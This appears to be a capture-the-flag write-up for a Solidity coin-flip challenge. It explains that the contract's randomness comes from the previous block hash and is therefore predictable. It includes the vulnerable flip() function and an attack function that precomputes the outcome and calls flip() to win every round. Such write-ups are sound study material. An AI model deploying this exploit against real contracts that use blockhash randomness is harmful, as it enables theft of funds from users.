# Requirements

- Guess the correct outcome of the coin flip 10 times in a row.

# Attack explanation

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. The coin flip seems to be randomly-determined but it's deterministic, as it depends from two values that are publicly available for everyone:

- Factor
- Block values

```
// factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

function flip(bool _guess) public returns (bool) {
    // Block values are easily retrieved from another sc. In this way, we can win 100% of times.
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

In this way, we will be able to win every flip if we use another smart contract that precalculates block values.

# Attack function

We could solve the challenge by just using the following attack function:

```
function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / factor;
    bool side = coinFlip == 1 ? true : false;

    // 100% chances of guessing flip, as we have precalculated the values.
    vulnerableScAddress.call(abi.encodeWithSignature("flip(bool)", side));
}
```
